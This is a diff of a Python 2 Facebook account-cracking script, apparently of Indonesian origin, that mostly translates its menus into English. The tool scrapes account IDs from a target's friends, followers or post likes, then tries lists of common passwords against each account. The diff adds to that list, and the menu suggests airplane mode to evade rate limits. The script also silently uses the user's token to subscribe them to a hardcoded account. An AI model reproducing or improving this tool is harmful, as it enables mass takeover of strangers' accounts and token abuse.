@@ -111,34 +111,34 @@ def menu():
 		time.sleep(3)
 		x_()
 	except requests.exceptions.ConnectionError:
-		print ('\033[0;91m !: Tidak Ada Koneksi')
+		print ('\033[0;91m !: No Connection')
 		sys.exit()
 	logo()
 	print"\033[0;97m Hay\033[0;92m " +ngentod
 	print
-        print(" \033[0;97m╔══o00════════00o═════════════════════════╗")
-	print" \033[0;97m(01). Crack from public Id"
-	print" \033[0;97m(02). Crack from followers"
-	print" \033[0;97m(03). Crack name search"
-	print" \033[0;97m(04). Check results "
-	print" \033[0;91m(00).\033[0;97m Remove token"
-	print(" \033[0;97m╚═════════════════════════════════════════╝")
+    print(" \033[0;91m╔══o00════════00o═════════════════════════╗")
+	print" \033[0;91m(01). \033[0;92mCrack from public Id"
+	print" \033[0;91m(02). \033[0;92mCrack from followers"
+	print" \033[0;91m(03). \033[0;92mCrack name search"
+	print" \033[0;91m(04). \033[0;92mCheck results "
+	print" \033[0;91m(00). \033[0;92m\033[0;97m Remove token"
+	print(" \033[0;91m╚═════════════════════════════════════════╝")
 	pilih_menu()
 
 def pilih_menu():
 	mi = raw_input("\n\033[0;97m ?: pilih : ")
 	if mi == "":
 		print
-		print ("\033[0;91m !: Isi yg benar") 
+		print ("\033[0;91m !: Fill in correctly") 
 		exit()
 	elif mi in['1','01']:
-		print ("\n \033[0;97m!: Ketik 'me' untuk crack daftar teman sendiri") 
-		idt = raw_input(" \033[0;97m?: id publik : ")
+		print ("\n \033[0;92m!: Type 'me' to crack your own friend list") 
+		idt = raw_input(" \033[0;92m?: Id Public : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print ("\033[0;91m !: Id tidak publik") 
+			print ("\033[0;91m !: Id not public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
@@ -148,13 +148,13 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['2','02']:
-		print ("\n \033[0;97m!: Ketik 'me' untuk crack followers sendiri") 
-		idt = raw_input("\033[0;97m ?: id publik : ")
+		print ("\n \033[0;92m!: Type 'me' to crack your own followers") 
+		idt = raw_input("\033[0;92m ?: Id Public : ")
 		try:
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 		except KeyError:
-			print (" \033[0;91m!: Id tidak publik") 
+			print (" \033[0;91m!: Id not public") 
 			exit()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
 		z = json.loads(r.text)
@@ -164,7 +164,7 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['33','003']:
-		idt = raw_input("\033[0;97m ?: id post publik : ")
+		idt = raw_input("\033[0;92m ?: Public Post Id link : ")
 		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -173,44 +173,44 @@ def pilih_menu():
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 	elif mi in['4','04']:
-		print"\n\033[0;97m 01. Cek hasil ok"
-		print" 02. Cek hasil cp"
-		ajg = raw_input("\n \033[0;97m?: pilih : ")
+		print"\n\033[0;92m (01). Check OK Ids"
+		print"\n\033[0;91m (02). Check CP Ids"
+		ajg = raw_input("\n \033[0;92m?: choose : ")
 		if ajg =="":
 			menu()
 		elif ajg in['1','01']:
-			print ("\n\033[0;97m [•] hasil \033[0;92mOK\033[0;97m tanggal : %s-%s-%s\033[0;92m\n" % (ha, op, ta)) 
+			print ("\n\033[0;97m [•] results \033[0;92mOK\033[0;91m date : %s-%s-%s\033[0;92m\n" % (ha, op, ta)) 
 			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
 			exit()
 		elif ajg in['2','02']:
-			print ("\n\033[0;97m [•] hasil \033[0;91mCP\033[0;97m tanggal : %s-%s-%s\033[0;91m\n" % (ha, op, ta)) 
+			print ("\n\033[0;97m [•] results \033[0;91mCP\033[0;91m date : %s-%s-%s\033[0;91m\n" % (ha, op, ta)) 
 			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
 			exit()
 		else:
-			exit("\033[0;91m !: pilih yang benar") 
+			exit("\033[0;91m [•] choose the right one") 
 	elif mi == "0" or mi == "00":
 		os.system("rm -f login.txt") 
-		print (" \033[0;92m√  berhasil menghapus token") 
+		print (" \033[0;92m√  successfully deleted token") 
 		exit()
 	else:
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		exit()
 	
-	print"\033[0;97m ?: total id  : " +str(len(id))
+	print"\033[0;92m ?: total id  : " +str(len(id))
 	anak_memek() 
 
 # Tambahan metode nya #
 def anak_memek():
-	print ("\n\033[0;97m [ Pilih metode crack ] \n")
-	print (" 01. b-api (fast)")
-	print (" 02. mbasic (slow)")
-	#print (" 03. mobile (very slow)")
+	print ("\n\033[0;92m [ Select the crack method ] \n")
+	print ("\n\033[0;91m (01). \033[0;92mb-api (fast)")
+	print ("\n\033[0;91m (02). \033[0;92mmbasic (slow)")
+	#print ("\n\033[0;91m (03). \033[0;92mmobile (very slow)")
 	romixyz()
 
 def romixyz():
-	rom = raw_input("\n \033[0;97m?: Pilih : ")
+	rom = raw_input("\n \033[0;91m?: choose : ")
 	if rom =='':
-		print ("\033[0;91m !: pilih yang benar ")
+		print ("\033[0;91m [•] choose the right one ")
 		romixyz()
 	elif rom in['1','01']:
 		romi_ganteng()
@@ -219,25 +219,25 @@ def romixyz():
 	elif rom in['33','033']:
 		romi_rzl()
 	else:
-		print ("\033[0;91m !: pilih yang benar ")
+		print ("\033[0;91m [•] choose the right one ")
 		romixyz()
 	
 # Metode api #
 def romi_ganteng():
-	romi = raw_input("\033[0;97m ?: Gunakan pasword manual? y/t : ")
+	romi = raw_input("\033[0;92m [•] Use manual password? y/t : ")
 	if romi=='':
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		romi_ganteng()
 	elif romi in['y','Y']:
 		manualbapi()
 	elif romi in['t','T']:
 		langsungapi()
 	else:
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		romi_ganteng()
 		
 def langsungapi():
-	print("\n \033[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n")
+	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use airplane mode 10 second\n")
 	
 	def main(arg):
 		global ok,cp,ua, loop
@@ -306,12 +306,12 @@ def langsungapi():
 	exit()
 
 def manualbapi():
-	print("\n\033[0;97m !: contoh pass : sayang,786786")
-	pw = raw_input(" \033[0;97m?: password : ").split(",")
+	print("\n\033[0;91m [•] example pass : sayang,786786")
+	pw = raw_input(" \033[0;92m?: password : ").split(",")
 	if len(pw) ==0:
-		exit("\033[0;91m !: tidak boleh kosong")
+		exit("\033[0;91m [•] cannot be empty")
 		
-	print("\n \033[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n")
+	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
 	
 	def main(arg):
 		global ok,cp,ua,loop
@@ -380,20 +380,20 @@ def manualbapi():
 	
 # Metode mbasic #
 def romi_gntg():
-	romi = raw_input("\033[0;97m ?: Gunakan pasword manual? y/t : ")
+	romi = raw_input("\033[0;92m [•] Use manual password? y/t : ")
 	if romi=='':
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		romi_gntg()
 	elif romi in['y','Y']:
 		manualbasic()
 	elif romi in['t','T']:
 		langsungbasic()
 	else:
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		romi_gntg()
 		
 def langsungbasic():
-	print("\n \033[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n")
+	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
 	
 	def main(user):
 		global loop, token,ok,cp,ua
@@ -413,13 +413,16 @@ def langsungbasic():
 #                 skm.append(nama+"1234")
 					skm.append(nama+"12345")
 				else:
+					skm.append(nama+"12")
 					skm.append(nama+"123")
 					skm.append(nama+"12345")
 					skm.append(nama+"1234")
-					skm.append("anjing")
-					skm.append("sayang")
+					skm.append(nama+"007")
+					skm.append("123456")
+					skm.append("223344")
 					skm.append("786786")
-					
+					skm.append("445566")
+					skm.append("778899")
 		try:
 			for pw in skm:
 				ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
@@ -467,12 +470,12 @@ def langsungbasic():
 	exit()
 
 def manualbasic():
-	print("\n\033[0;97m !: contoh pass : sayang,786786")
-	pw = raw_input(" \033[0;97m?: password : ").split(",")
+	print("\n\033[0;91m [•]  example pass : sayang,786786")
+	pw = raw_input(" \033[0;92m?: password : ").split(",")
 	if len(pw) ==0:
-		exit("\033[0;91m !: tidak boleh kosong")
+		exit("\033[0;91m [•] cannot be empty")
 		
-	print("\n \033[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n")
+	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
 	
 	def main(arg):
 		global ok,cp,ua,loop,token
@@ -533,20 +536,20 @@ def manualbasic():
 	
 # Metode Mobile #
 def romi_rzl():
-	romi = raw_input("\033[0;97m ?: Gunakan pasword manual? y/t : ")
+	romi = raw_input("\033[0;92m [•] Use manual password? y/t : ")
 	if romi=='':
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		romi_rzl()
 	elif romi in['y','Y']:
 		m_fb()
 	elif romi in['t','T']:
 		mobile()
 	else:
-		print ("\033[0;91m !: pilih yang benar ") 
+		print ("\033[0;91m [•] choose the right one ") 
 		romi_rzl()
 		
 def mobile():
-	print("\n !: crack started...\n")
+	print("\n \033[0;92m[•] crack started...\n")
 	
 	def main(arg):
 		global ok,cp,ua, loop
@@ -604,13 +607,13 @@ def mobile():
 	exit()
 
 def m_fb():
-	print("\n\033[0;97m !: contoh pass : sayang,786786")
+	print("\n\033[0;91m [•] example pass : sayang,786786")
 	pw = raw_input(" \033[0;97m?: password : ").split(",")
 	if len(pw) ==0:
-		print("\033[0;91m !: tidak boleh kosong")
+		print("\033[0;91m [•] cannot be empty")
 		m_fb()
 		
-	print("\n \033[0;97m!: crack started...\n")
+	print("\n \033[0;92m[•] crack started...\n")
 	
 	def main(arg):
 		global ok,cp,ua,loop
@@ -672,7 +675,7 @@ def login_xx():
     try:
         romz = open('login.txt', 'r').read()
     except IOError:
-        print ('\033[0;91m !: Token invalid') 
+        print ('\033[0;91m [•] Token invalid') 
         os.system('rm -rf login.txt')
         
     requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
@@ -701,10 +704,10 @@ def x_():
 			lampung = open("login.txt", 'w')
 			lampung.write(token)
 			lampung.close()
-			print ("\033[0;92m √ login berhasil ")
+			print ("\033[0;92m √ login successful ")
 			login_xx()
 		except KeyError:
-			print ("\033[0;91m !: Token Invalid") 
+			print ("\033[0;91m [•] Token Invalid") 
 			sys.exit()
 			
 x_()
